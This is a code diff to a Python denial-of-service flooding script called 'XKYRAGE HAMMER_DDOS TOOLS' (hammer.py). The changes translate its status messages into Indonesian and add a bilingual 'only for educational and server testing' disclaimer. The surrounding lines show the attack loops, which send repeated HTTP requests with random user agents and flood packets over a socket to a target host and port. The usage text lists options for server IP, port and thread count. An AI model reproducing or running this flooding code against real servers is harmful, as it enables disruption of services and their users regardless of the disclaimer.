@@ -30,7 +30,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94m bot sedang menyerang target...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -44,13 +44,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--PAKET TELAH TERKIRIM! MENYERANG--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				print("\033[91mPROSES<->MATIKAN\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mno SOMETHING WRONG! KONEKSI ATAU SERVER MUNGKIN DOWN\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -71,8 +71,12 @@ def dos2():
 
 def usage():
 	print (''' \033[92m	XKYRAGE HAMMER_DDOS TOOLS
-	this tools is only for educational and for server testing.
-  remember you are traceable. :) \n
+	
+	tool ini hanya untuk edukasi dan test server.
+	ingat anda sangat mungkin untuk terlacak. :) \n
+	
+	this tool is only for educational and for server testing.
+ 	remember you are traceable. :) \n
 	usage : python3 hammer.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
